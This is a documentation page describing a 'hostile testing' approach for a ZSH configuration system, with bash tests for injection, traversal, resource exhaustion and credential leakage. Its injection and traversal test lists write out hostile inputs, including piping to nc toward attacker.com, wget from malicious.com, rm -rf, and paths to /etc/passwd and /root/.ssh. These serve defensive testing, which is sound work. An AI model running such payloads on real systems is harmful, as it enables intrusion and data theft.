Hostile Testing Philosophy
=========================

This document explains the hostile testing approach used throughout the ZSH configuration system API documentation.

.. warning::

   All tests in this documentation follow **hostile testing principles** - they are designed to break the system, not validate happy paths.

Overview
--------

The ZSH configuration system uses **hostile testing** as mandated by the development requirements. This approach replaces traditional "vanity tests" with real failure-detection tests.

**Hostile Testing Definition:**

Hostile testing has three mandatory components:

1. **BREAK THE ENVIRONMENT** - Test with broken PATH, corrupted files, missing dependencies, exhausted resources, malicious environment variables
2. **ASSUME THE DEVELOPER IS AN IDIOT** - Test for command injection, path traversal, buffer overflows, missing input validation, race conditions, resource leaks, silent failures
3. **WRITE LIKE A VP ENGINEERING TRYING TO FIRE THE DEVELOPER** - Be ruthless in finding ANY excuse. Look for security vulnerabilities, performance issues, poor error handling, inconsistent state management, timing attacks, memory corruption.

Vanity Tests vs Hostile Tests
-----------------------------

**❌ VANITY TESTS (Eliminated)**

Vanity tests only verify functions exist or basic functionality works:

.. code-block:: bash

   # VANITY TEST - Only checks function exists
   test_function_exists() {
       type my_function >/dev/null 2>&1
   }

   # VANITY TEST - Only tests happy path
   test_basic_functionality() {
       my_function "valid_input"
       [[ $? -eq 0 ]]
   }

**✅ HOSTILE TESTS (Required)**

Hostile tests attempt to break the system and verify security:

.. code-block:: bash

   # HOSTILE TEST - Command injection resistance
   test_function_injection_resistance() {
       # Test command injection attempts - should not execute malicious commands
       my_function "input; rm -rf /tmp/attack" >/dev/null 2>&1
       assert_equals $? 1 "Should reject command injection attempts"
       assert_false "[ -f '/tmp/attack_executed' ]" "Should not execute injected commands"

       # Test with command substitution attempts
       my_function "\\$(touch /tmp/exploit)" >/dev/null 2>&1
       assert_equals $? 1 "Should reject command substitution attacks"
       assert_false "[ -f '/tmp/exploit' ]" "Should not execute command substitution"
   }

Test Categories
---------------

**1. Security Vulnerability Tests**

- **Command Injection**: Verify functions resist shell command injection
- **Path Traversal**: Ensure file operations don't escape intended directories
- **Information Disclosure**: Verify sensitive data isn't leaked in error messages
- **Input Validation**: Test with malformed, oversized, and malicious input
- **Authentication Bypass**: Verify credential systems can't be circumvented

**2. Resource Exhaustion Tests**

- **Memory Leaks**: Verify functions don't consume excessive memory
- **CPU Starvation**: Test behavior under high CPU load
- **Disk Space**: Test with insufficient disk space
- **File Descriptor Limits**: Test with exhausted file descriptors
- **Network Timeouts**: Verify proper timeout handling

**3. Race Condition Tests**

- **Concurrent Access**: Test multiple simultaneous function calls
- **File Locking**: Verify proper file access coordination
- **Signal Handling**: Test behavior during signal interruption
- **Process Cleanup**: Verify proper cleanup of background processes

**4. Environmental Attack Tests**

- **PATH Manipulation**: Test with corrupted or malicious PATH
- **Environment Pollution**: Test with malicious environment variables
- **Missing Dependencies**: Test behavior when required tools are missing
- **Filesystem Corruption**: Test with corrupted or read-only filesystems

Test Implementation Patterns
----------------------------

**Pattern 1: Injection Resistance**

.. code-block:: bash

   test_function_injection_resistance() {
       local injection_attempts=(
           "input; rm -rf /tmp/attack"
           "input\\$(touch /tmp/exploit)"
           "input\\`id > /tmp/command\\`"
           "input|nc attacker.com 4444"
           "input&wget malicious.com/script"
       )

       for injection in "${injection_attempts[@]}"; do
           my_function "$injection" >/dev/null 2>&1

           # Verify no commands were executed
           assert_false "[ -f '/tmp/attack' ]" "Should not execute rm"
           assert_false "[ -f '/tmp/exploit' ]" "Should not execute touch"
           assert_false "[ -f '/tmp/command' ]" "Should not execute id"
       done
   }

**Pattern 2: Resource Exhaustion**

.. code-block:: bash

   test_function_resource_exhaustion() {
       local start_memory=$(ps -o rss= -p $$ 2>/dev/null || echo 0)

       # Stress test with many iterations
       for i in {1..1000}; do
           my_function "test_input_$i" >/dev/null 2>&1
       done

       local end_memory=$(ps -o rss= -p $$ 2>/dev/null || echo 0)
       local memory_increase=$((end_memory - start_memory))

       # Should not leak significant memory
       assert_true "(( memory_increase < 1024 ))" "Should not leak memory (leaked ${memory_increase}KB)"
   }

**Pattern 3: Race Conditions**

.. code-block:: bash

   test_function_race_conditions() {
       local pids=()

       # Launch concurrent operations
       for i in {1..20}; do
           (my_function "input_$i" > "/tmp/result_$i") &
           pids+=($!)
       done

       # Wait for all processes
       for pid in "${pids[@]}"; do
           wait "$pid" 2>/dev/null || true
       done

       # Verify all operations completed correctly
       local success_count=0
       for i in {1..20}; do
           if [[ -f "/tmp/result_$i" ]]; then
               ((success_count++))
               rm -f "/tmp/result_$i"
           fi
       done

       assert_true "(( success_count >= 18 ))" "At least 90% of concurrent operations should succeed"
   }

**Pattern 4: Information Disclosure Prevention**

.. code-block:: bash

   test_function_information_disclosure() {
       # Set sensitive environment
       export SECRET_PASSWORD="TopSecret123!"
       export API_KEY="secret_api_key_456"

       # Capture all output during error conditions
       local output=$(my_function "invalid_input" 2>&1 || true)

       # Verify no sensitive information leaked
       assert_false "[[ '$output' =~ 'TopSecret123!' ]]" "Should not disclose passwords"
       assert_false "[[ '$output' =~ 'secret_api_key' ]]" "Should not disclose API keys"
       assert_false "[[ '$output' =~ '/Users/.*/credentials' ]]" "Should not disclose file paths"
   }

Implementation Requirements
---------------------------

**All API Reference Tests Must:**

1. **Test Failure Modes**: Every test must attempt to break the function
2. **Verify Security**: No command injection, path traversal, or information disclosure
3. **Check Resource Usage**: Memory, CPU, disk, and network resource protection
4. **Test Concurrency**: Race conditions and concurrent access patterns
5. **Validate Input**: Malformed, oversized, and malicious input handling

**Test Naming Convention:**

- All hostile tests must be prefixed with ``# HOSTILE TEST:``
- Test names should describe the attack vector being tested
- Examples: ``test_function_injection_resistance``, ``test_function_resource_exhaustion``

**Assertion Requirements:**

- Use ``assert_false`` to verify malicious actions did NOT occur
- Use ``assert_true`` for resource limits and performance requirements
- Always include descriptive failure messages
- Test both positive (should work) and negative (should fail) cases

Production Readiness Criteria
------------------------------

A function is considered production-ready only when:

1. **All hostile tests pass** - No security vulnerabilities detected
2. **Performance requirements met** - Resource usage within acceptable limits
3. **Concurrent access safe** - No race conditions or data corruption
4. **Error handling robust** - Graceful failure under all tested conditions
5. **Information secure** - No sensitive data disclosure in any scenario

**Failure Standards:**

Any function that fails hostile testing is **BLOCKED from production** until:

- Security vulnerabilities are patched
- Resource leaks are eliminated
- Race conditions are resolved
- Error handling is improved
- Information disclosure is prevented

This hostile testing approach ensures the ZSH configuration system meets enterprise security and reliability standards.

Examples from Real Tests
------------------------

**Hostile Test: Command Injection in mkcd()**

.. code-block:: bash

   # HOSTILE TEST: Path traversal attack resistance
   test_mkcd_path_traversal_attack() {
       local original_dir="$PWD"

       # Test various path traversal attempts
       local attacks=(
           "../../../etc/passwd"
           "/tmp/../../../root/.ssh"
           "../../../../usr/bin/dangerous"
       )

       for attack in "${attacks[@]}"; do
           mkcd "$attack" 2>/dev/null || true

           # Should not end up in system directories
           assert_false "[[ '$PWD' =~ '/etc' ]]" "Should not traverse to /etc via: $attack"
           assert_false "[[ '$PWD' =~ '/root' ]]" "Should not traverse to /root via: $attack"

           cd "$original_dir" 2>/dev/null || true
       done
   }

**Hostile Test: Credential Security in Database Functions**

.. code-block:: bash

   # HOSTILE TEST: Credential information disclosure prevention
   test_postgres_credentials_disclosure_prevention() {
       # Set up credential with sensitive information
       export PGPASSWORD="SuperSecret123!"

       # Capture all output during credential setup
       local output=$(setup_postgres_credentials 2>&1)

       # Verify no sensitive information is disclosed
       assert_false "[[ '$output' =~ 'SuperSecret123!' ]]" "Should not disclose password in output"
       assert_false "[[ '$output' =~ 'PGPASSWORD' ]]" "Should not show PGPASSWORD variable"
   }

This approach has replaced all vanity tests in the API documentation with real security and reliability tests that would catch actual production failures.